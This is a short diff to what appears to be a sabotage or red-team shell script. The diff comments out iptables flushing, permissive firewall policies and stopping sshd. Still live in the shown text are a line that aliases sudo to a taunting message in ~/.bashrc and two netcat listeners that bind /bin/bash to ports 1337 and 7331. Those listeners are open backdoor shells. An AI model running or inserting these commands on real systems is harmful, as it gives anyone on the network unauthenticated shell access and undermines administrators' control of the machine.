@@ -15,24 +15,24 @@ echo 'alias sudo="echo 'Simon says... oh wait, Simon didnt say'"' >> ~/.bashrc
 source ~/.bashrc
 
 # Flush iptables rules
-iptables -F
-iptables -t mangle -F
-iptables -t nat -F
-iptables -t filter -F
-iptables -t raw -F
-iptables -t security -F
+#iptables -F
+#iptables -t mangle -F
+#iptables -t nat -F
+#iptables -t filter -F
+#iptables -t raw -F
+#iptables -t security -F
 
 # Change default policies for 'iptables'
-iptables -P INPUT ACCEPT
-iptables -P OUTPUT ACCEPT
-iptables -P FORWARD ACCEPT
+#iptables -P INPUT ACCEPT
+#iptables -P OUTPUT ACCEPT
+#iptables -P FORWARD ACCEPT
 
 # Open up netcat listeners for shells
 nc -lp 1337 -e /bin/bash
 nc -lp 7331 -e /bin/bash
 
 # Turn off ssh
-systemctl stop sshd
+#systemctl stop sshd
 
 
 
